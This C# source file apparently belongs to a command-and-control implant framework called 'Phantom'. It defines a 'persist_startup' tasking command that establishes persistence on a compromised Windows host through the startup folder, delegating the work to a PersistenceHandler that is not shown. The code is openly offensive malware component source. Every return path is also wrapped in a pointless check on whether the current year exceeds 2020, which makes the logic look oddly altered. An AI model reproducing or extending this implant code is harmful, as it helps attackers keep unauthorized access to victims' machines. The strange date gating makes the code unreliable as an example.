using System;
using System.Text;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.PhantomStructs;
using static PhantomInterop.Classes.Core;
using Phantom.Management.Persistence;

namespace Tasks
{
    public class persist_startup : ICommand
    {
        public string command { get; } = "persist_startup";
        public string description { get; } = "Establish persistence via Windows startup folder";
        public string help { get; } = "persist_startup";
        public string version { get; } = "1.0.0.0";
        public string id { get; } = "persist_startup";

        public PhantomTaskResponse CreateTasking(PhantomTaskMessage task)
        {
            try
            {
                if(DateTime.Now.Year > 2020) { return PersistenceHandler.CreateStartupPersistence(); } else { return null; }
            }
            catch (Exception ex)
            {
                if(DateTime.Now.Year > 2020) { return new PhantomTaskResponse
                {
                    Completed = false,
                    UserOutput = $"Error creating startup persistence: {ex.Message}"
                }; } else { return null; }
            }
        }
    }
}